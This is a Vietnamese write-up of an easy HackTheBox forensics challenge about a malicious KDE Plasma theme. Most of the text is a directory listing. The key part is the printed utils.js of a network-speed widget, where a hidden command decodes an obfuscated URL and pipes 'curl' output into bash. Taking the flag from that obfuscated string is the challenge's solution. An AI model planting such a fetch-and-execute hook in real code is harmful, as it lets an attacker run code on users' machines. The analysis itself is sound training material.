> [!NOTE]
> - Mức độ: Rất dễ 
> - Loại: Forensics 
> - Url: [Sp00ky Theme](https://app.hackthebox.com/challenges/Sp00ky%2520Theme)
> - Tình huống: Tôi đã tải xuống một chủ đề (theme) tổng thể theo phong cách Halloween rất đẹp cho hệ thống Plasma của mình, cùng với vài tiện ích (widget)! Đáng lẽ nó phải giúp xua đuổi tà ma trong lúc tôi đang trau dồi kỹ năng tùy biến giao diện (ricing)... Thế nhưng, giờ đây lại xuất hiện những hiện tượng kỳ lạ mà tôi chẳng thể nào hiểu nổi nguyên nhân...

> - Giải nén file zip sẽ thấy 1 file `util.js` rất đáng chú ý 

```
└─$ ls -alR
.:
total 0
drwxr-xr-x 1 kalilinux kalilinux 68 Oct  3  2024 .
drwxr-xr-x 1 kalilinux kalilinux 92 Oct 21 05:04 ..
drwxr-xr-x 1 kalilinux kalilinux  8 Oct  5  2024 desktoptheme
drwxr-xr-x 1 kalilinux kalilinux  8 Oct  5  2024 look-and-feel
drwxr-xr-x 1 kalilinux kalilinux 44 Oct  5  2024 plasmoids

./desktoptheme:
total 0
drwxr-xr-x 1 kalilinux kalilinux   8 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux  68 Oct  3  2024 ..
drwxr-xr-x 1 kalilinux kalilinux 106 Oct  5  2024 Otto

./desktoptheme/Otto:
total 12
drwxr-xr-x 1 kalilinux kalilinux  106 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux    8 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 2052 Oct  5  2024 colors
drwxr-xr-x 1 kalilinux kalilinux   30 Oct  5  2024 dialogs
drwxr-xr-x 1 kalilinux kalilinux 1552 Oct  5  2024 icons
-rw-r--r-- 1 kalilinux kalilinux  453 Oct  5  2024 metadata.json
-rw-r--r-- 1 kalilinux kalilinux  206 Oct  5  2024 plasmarc
drwxr-xr-x 1 kalilinux kalilinux   32 Oct  5  2024 weather
drwxr-xr-x 1 kalilinux kalilinux 1294 Oct  5  2024 widgets

./desktoptheme/Otto/dialogs:
total 4
drwxr-xr-x 1 kalilinux kalilinux   30 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux  106 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 3497 Oct  5  2024 background.svgz

./desktoptheme/Otto/icons:
total 324
drwxr-xr-x 1 kalilinux kalilinux  1552 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux   106 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux  1526 Oct  5  2024 akonadi.svgz
-rw-r--r-- 1 kalilinux kalilinux   735 Oct  5  2024 akregator.svgz
-rw-r--r-- 1 kalilinux kalilinux  4150 Oct  5  2024 amarok.svgz
-rw-r--r-- 1 kalilinux kalilinux  1027 Oct  5  2024 applications.svgz
-rw-r--r-- 1 kalilinux kalilinux  1195 Oct  5  2024 apport.svgz
-rw-r--r-- 1 kalilinux kalilinux  2494 Oct  5  2024 audio.svgz
-rw-r--r-- 1 kalilinux kalilinux  3734 Oct  5  2024 battery.svgz
-rw-r--r-- 1 kalilinux kalilinux   932 Oct  5  2024 bookmarks.svgz
-rw-r--r-- 1 kalilinux kalilinux  1523 Oct  5  2024 cantata.svgz
-rw-r--r-- 1 kalilinux kalilinux  1633 Oct  5  2024 computer.svgz
-rw-r--r-- 1 kalilinux kalilinux   841 Oct  5  2024 configure.svgz
-rw-r--r-- 1 kalilinux kalilinux  1687 Oct  5  2024 device.svgz
-rw-r--r-- 1 kalilinux kalilinux  1032 Oct  5  2024 disk.svgz
-rw-r--r-- 1 kalilinux kalilinux   486 Oct  5  2024 distribute.svgz
-rw-r--r-- 1 kalilinux kalilinux  1623 Oct  5  2024 document.svgz
-rw-r--r-- 1 kalilinux kalilinux   627 Oct  5  2024 drive.svgz
-rw-r--r-- 1 kalilinux kalilinux   430 Oct  5  2024 edit.svgz
-rw-r--r-- 1 kalilinux kalilinux 19512 Oct  5  2024 fcitx.svgz
-rw-r--r-- 1 kalilinux kalilinux   560 Oct  5  2024 go.svgz
-rw-r--r-- 1 kalilinux kalilinux 15284 Oct  5  2024 ime.svgz
-rw-r--r-- 1 kalilinux kalilinux  4276 Oct  5  2024 input.svgz
-rw-r--r-- 1 kalilinux kalilinux  1537 Oct  5  2024 kalarm.svgz
-rw-r--r-- 1 kalilinux kalilinux  3071 Oct  5  2024 kdeconnect.svgz
-rw-r--r-- 1 kalilinux kalilinux  2107 Oct  5  2024 keyboard.svgz
-rw-r--r-- 1 kalilinux kalilinux  1409 Oct  5  2024 kget.svgz
-rw-r--r-- 1 kalilinux kalilinux  1215 Oct  5  2024 kgpg.svgz
-rw-r--r-- 1 kalilinux kalilinux  2536 Oct  5  2024 kleopatra.svgz
-rw-r--r-- 1 kalilinux kalilinux  1524 Oct  5  2024 klipper.svgz
-rw-r--r-- 1 kalilinux kalilinux  1505 Oct  5  2024 kmail.svgz
-rw-r--r-- 1 kalilinux kalilinux  1426 Oct  5  2024 konversation.svgz
-rw-r--r-- 1 kalilinux kalilinux  1767 Oct  5  2024 konv_message.svgz
-rw-r--r-- 1 kalilinux kalilinux  1413 Oct  5  2024 kopete.svgz
-rw-r--r-- 1 kalilinux kalilinux  1321 Oct  5  2024 korgac.svgz
-rw-r--r-- 1 kalilinux kalilinux  1692 Oct  5  2024 kpackagekit.svgz
-rw-r--r-- 1 kalilinux kalilinux   914 Oct  5  2024 kruler.svgz
-rw-r--r-- 1 kalilinux kalilinux  1432 Oct  5  2024 kteatime.svgz
-rw-r--r-- 1 kalilinux kalilinux   822 Oct  5  2024 ktorrent.svgz
-rw-r--r-- 1 kalilinux kalilinux   518 Oct  5  2024 kup.svgz
-rw-r--r-- 1 kalilinux kalilinux   443 Oct  5  2024 list.svgz
-rw-r--r-- 1 kalilinux kalilinux  1273 Oct  5  2024 mail.svgz
-rw-r--r-- 1 kalilinux kalilinux  2622 Oct  5  2024 media.svgz
-rw-r--r-- 1 kalilinux kalilinux   596 Oct  5  2024 mobile.svgz
-rw-r--r-- 1 kalilinux kalilinux 15701 Oct  5  2024 network.svgz
-rw-r--r-- 1 kalilinux kalilinux  1137 Oct  5  2024 notification.svgz
-rw-r--r-- 1 kalilinux kalilinux  8595 Oct  5  2024 osd.svgz
-rw-r--r-- 1 kalilinux kalilinux  1959 Oct  5  2024 phone.svgz
-rw-r--r-- 1 kalilinux kalilinux   538 Oct  5  2024 plasmavault_error.svgz
-rw-r--r-- 1 kalilinux kalilinux   524 Oct  5  2024 plasmavault.svgz
-rw-r--r-- 1 kalilinux kalilinux  1546 Oct  5  2024 preferences.svgz
-rw-r--r-- 1 kalilinux kalilinux  2133 Oct  5  2024 printer.svgz
-rw-r--r-- 1 kalilinux kalilinux  1441 Oct  5  2024 quassel.svgz
-rw-r--r-- 1 kalilinux kalilinux  1489 Oct  5  2024 search.svgz
-rw-r--r-- 1 kalilinux kalilinux  1976 Oct  5  2024 slc.svgz
-rw-r--r-- 1 kalilinux kalilinux  1814 Oct  5  2024 software.svgz
-rw-r--r-- 1 kalilinux kalilinux  1706 Oct  5  2024 start.svgz
-rw-r--r-- 1 kalilinux kalilinux  6872 Oct  5  2024 system.svgz
-rw-r--r-- 1 kalilinux kalilinux  1395 Oct  5  2024 touchpad.svgz
-rw-r--r-- 1 kalilinux kalilinux  1384 Oct  5  2024 user.svgz
-rw-r--r-- 1 kalilinux kalilinux  1140 Oct  5  2024 video-card.svgz
-rw-r--r-- 1 kalilinux kalilinux  2691 Oct  5  2024 video.svgz
-rw-r--r-- 1 kalilinux kalilinux   931 Oct  5  2024 view.svgz
-rw-r--r-- 1 kalilinux kalilinux  1012 Oct  5  2024 vlc.svgz
-rw-r--r-- 1 kalilinux kalilinux  1548 Oct  5  2024 wallet.svgz
-rw-r--r-- 1 kalilinux kalilinux   913 Oct  5  2024 window.svgz
-rw-r--r-- 1 kalilinux kalilinux  1071 Oct  5  2024 yakuake.svgz
-rw-r--r-- 1 kalilinux kalilinux  2072 Oct  5  2024 zoom.svgz

./desktoptheme/Otto/weather:
total 4
drwxr-xr-x 1 kalilinux kalilinux   32 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux  106 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 2164 Oct  5  2024 wind-arrows.svgz

./desktoptheme/Otto/widgets:
total 1124
drwxr-xr-x 1 kalilinux kalilinux   1294 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux    106 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux   2037 Oct  5  2024 actionbutton.svgz
-rw-r--r-- 1 kalilinux kalilinux   2409 Oct  5  2024 action-overlays.svgz
-rw-r--r-- 1 kalilinux kalilinux   6576 Oct  5  2024 analog_meter.svgz
-rw-r--r-- 1 kalilinux kalilinux   1359 Oct  5  2024 arrows.svgz
-rw-r--r-- 1 kalilinux kalilinux   3703 Oct  5  2024 background.svgz
-rw-r--r-- 1 kalilinux kalilinux   2282 Oct  5  2024 bar_meter_horizontal.svgz
-rw-r--r-- 1 kalilinux kalilinux  29200 Oct  5  2024 bar_meter_vertical.svgz
-rw-r--r-- 1 kalilinux kalilinux   1641 Oct  5  2024 branding.svgz
-rw-r--r-- 1 kalilinux kalilinux   2303 Oct  5  2024 busywidget.svgz
-rw-r--r-- 1 kalilinux kalilinux   6561 Oct  5  2024 button.svgz
-rw-r--r-- 1 kalilinux kalilinux   1301 Oct  5  2024 calendar.svgz
-rw-r--r-- 1 kalilinux kalilinux   1087 Oct  5  2024 checkmarks.svgz
-rw-r--r-- 1 kalilinux kalilinux   9084 Oct  5  2024 clock.svgz
-rw-r--r-- 1 kalilinux kalilinux   5223 Oct  5  2024 configuration-icons.svgz
-rw-r--r-- 1 kalilinux kalilinux   3116 Oct  5  2024 containment-controls.svgz
-rw-r--r-- 1 kalilinux kalilinux   2187 Oct  5  2024 dragger.svgz
-rw-r--r-- 1 kalilinux kalilinux   3495 Oct  5  2024 frame.svgz
-rw-r--r-- 1 kalilinux kalilinux  14186 Oct  5  2024 glowbar.svgz
-rw-r--r-- 1 kalilinux kalilinux   4799 Oct  5  2024 lineedit.svgz
-rw-r--r-- 1 kalilinux kalilinux    654 Oct  5  2024 line.svgz
-rw-r--r-- 1 kalilinux kalilinux   3620 Oct  5  2024 listitem.svgz
-rw-r--r-- 1 kalilinux kalilinux   2155 Oct  5  2024 margins-highlight.svgz
-rw-r--r-- 1 kalilinux kalilinux   4345 Oct  5  2024 media-delegate.svgz
-rw-r--r-- 1 kalilinux kalilinux   1668 Oct  5  2024 menubaritem.svgz
-rw-r--r-- 1 kalilinux kalilinux 864625 Oct  5  2024 monitor.svgz
-rw-r--r-- 1 kalilinux kalilinux   5782 Oct  5  2024 notes.svgz
-rw-r--r-- 1 kalilinux kalilinux   2733 Oct  5  2024 pager.svgz
-rw-r--r-- 1 kalilinux kalilinux   4384 Oct  5  2024 panel-background.svgz
-rw-r--r-- 1 kalilinux kalilinux   3636 Oct  5  2024 picker.svgz
-rw-r--r-- 1 kalilinux kalilinux   1521 Oct  5  2024 plasmoidheading.svgz
-rw-r--r-- 1 kalilinux kalilinux   1114 Oct  5  2024 plot-background.svgz
-rw-r--r-- 1 kalilinux kalilinux   1916 Oct  5  2024 radiobutton.svgz
-rw-r--r-- 1 kalilinux kalilinux   3554 Oct  5  2024 scrollbar.svgz
-rw-r--r-- 1 kalilinux kalilinux   1469 Oct  5  2024 scrollwidget.svgz
-rw-r--r-- 1 kalilinux kalilinux   2748 Oct  5  2024 slider.svgz
-rw-r--r-- 1 kalilinux kalilinux   2404 Oct  5  2024 switch.svgz
-rw-r--r-- 1 kalilinux kalilinux   1490 Oct  5  2024 tabbar.svgz
-rw-r--r-- 1 kalilinux kalilinux   8644 Oct  5  2024 tasks.svgz
-rw-r--r-- 1 kalilinux kalilinux   7503 Oct  5  2024 timer.svgz
-rw-r--r-- 1 kalilinux kalilinux    828 Oct  5  2024 toolbar.svgz
-rw-r--r-- 1 kalilinux kalilinux   3677 Oct  5  2024 tooltip.svgz
-rw-r--r-- 1 kalilinux kalilinux   4344 Oct  5  2024 translucentbackground.svgz
-rw-r--r-- 1 kalilinux kalilinux  20347 Oct  5  2024 viewitem.svgz

./look-and-feel:
total 0
drwxr-xr-x 1 kalilinux kalilinux  8 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux 68 Oct  3  2024 ..
drwxr-xr-x 1 kalilinux kalilinux 42 Oct  5  2024 Otto

./look-and-feel/Otto:
total 4
drwxr-xr-x 1 kalilinux kalilinux   42 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux    8 Oct  5  2024 ..
drwxr-xr-x 1 kalilinux kalilinux   46 Oct  5  2024 contents
-rw-r--r-- 1 kalilinux kalilinux 1046 Oct  5  2024 metadata.json

./look-and-feel/Otto/contents:
total 4
drwxr-xr-x 1 kalilinux kalilinux  46 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux  42 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 441 Oct  5  2024 defaults
drwxr-xr-x 1 kalilinux kalilinux  64 Oct  5  2024 layouts
drwxr-xr-x 1 kalilinux kalilinux  64 Oct  5  2024 previews

./look-and-feel/Otto/contents/layouts:
total 8
drwxr-xr-x 1 kalilinux kalilinux   64 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux   46 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 5252 Oct  5  2024 org.kde.plasma.desktop-layout.js

./look-and-feel/Otto/contents/previews:
total 204
drwxr-xr-x 1 kalilinux kalilinux     64 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux     46 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 144211 Oct  5  2024 fullscreenpreview.jpg
-rw-r--r-- 1 kalilinux kalilinux  58738 Oct  5  2024 preview.png

./plasmoids:
total 0
drwxr-xr-x 1 kalilinux kalilinux 44 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux 68 Oct  3  2024 ..
drwxr-xr-x 1 kalilinux kalilinux 42 Oct  5  2024 org.kde.netspeedWidget

./plasmoids/org.kde.netspeedWidget:
total 4
drwxr-xr-x 1 kalilinux kalilinux  42 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux  44 Oct  5  2024 ..
drwxr-xr-x 1 kalilinux kalilinux  24 Oct  5  2024 contents
-rw-r--r-- 1 kalilinux kalilinux 746 Oct  5  2024 metadata.json

./plasmoids/org.kde.netspeedWidget/contents:
total 0
drwxr-xr-x 1 kalilinux kalilinux  24 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux  42 Oct  5  2024 ..
drwxr-xr-x 1 kalilinux kalilinux  16 Oct 20  2024 code
drwxr-xr-x 1 kalilinux kalilinux  36 Oct  5  2024 config
drwxr-xr-x 1 kalilinux kalilinux 102 Oct  5  2024 ui

./plasmoids/org.kde.netspeedWidget/contents/code:
total 4
drwxr-xr-x 1 kalilinux kalilinux   16 Oct 20  2024 .
drwxr-xr-x 1 kalilinux kalilinux   24 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 1196 Oct 20  2024 utils.js

./plasmoids/org.kde.netspeedWidget/contents/config:
total 8
drwxr-xr-x 1 kalilinux kalilinux   36 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux   24 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux  378 Oct  5  2024 config.qml
-rw-r--r-- 1 kalilinux kalilinux 2364 Oct  5  2024 main.xml

./plasmoids/org.kde.netspeedWidget/contents/ui:
total 24
drwxr-xr-x 1 kalilinux kalilinux   102 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux    24 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 13291 Oct  5  2024 CompactRepresentation.qml
drwxr-xr-x 1 kalilinux kalilinux   160 Oct  5  2024 config
-rw-r--r-- 1 kalilinux kalilinux   170 Oct  5  2024 Launcher.qml
-rw-r--r-- 1 kalilinux kalilinux  3233 Oct  5  2024 main.qml

./plasmoids/org.kde.netspeedWidget/contents/ui/config:
total 32
drwxr-xr-x 1 kalilinux kalilinux  160 Oct  5  2024 .
drwxr-xr-x 1 kalilinux kalilinux  102 Oct  5  2024 ..
-rw-r--r-- 1 kalilinux kalilinux 4605 Oct  5  2024 AppMenuDialog.qml
-rw-r--r-- 1 kalilinux kalilinux 1852 Oct  5  2024 AppPicker.qml
-rw-r--r-- 1 kalilinux kalilinux 1709 Oct  5  2024 ColorPicker.qml
-rw-r--r-- 1 kalilinux kalilinux 4803 Oct  5  2024 ConfigAdvanced.qml
-rw-r--r-- 1 kalilinux kalilinux 8116 Oct  5  2024 ConfigGeneral.qml
```

> - File `utils.js` chứa 1 chuỗi mã hóa base64 dùng để giải mã thu được UPDATE_URL 

```javascript
─$ cat utils.js                                       
const NET_DATA_SOURCE =
    "awk -v OFS=, 'NR > 2 { print substr($1, 1, length($1)-1), $2, $10 }' /proc/net/dev";

const PLASMOID_UPDATE_SOURCE = 
    "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"

function parseTransferData(data) {
    const transferData = {};

    for (const line of data.trim("\n").split("\n")) {
        const [name, rx, tx] = line.split(",");

        if (name === "lo") {
            continue;
        }

        transferData[name] = { rx, tx };
    }

    return transferData;
}

function calcSpeedData(prevTransferData, nextTransferData, duration) {
    const speedData = {};

    for (const key in nextTransferData) {
        if (prevTransferData && key in prevTransferData) {
            const prev = prevTransferData[key];
            const next = nextTransferData[key];
            speedData[key] = {
                down: ((next.rx - prev.rx) * 1000) / duration,
                up: ((next.tx - prev.tx) * 1000) / duration,
                downTotal: nextTransferData[key].rx,
                upTotal: nextTransferData[key].tx,
            };
        }
    }

    return speedData;
}
```

> - Giải mã chuỗi base64 đảo ngược 

```
└─$ echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d
HTB{pwn3d_by_th3m3s!?_1t_c4n_h4pp3n}    
```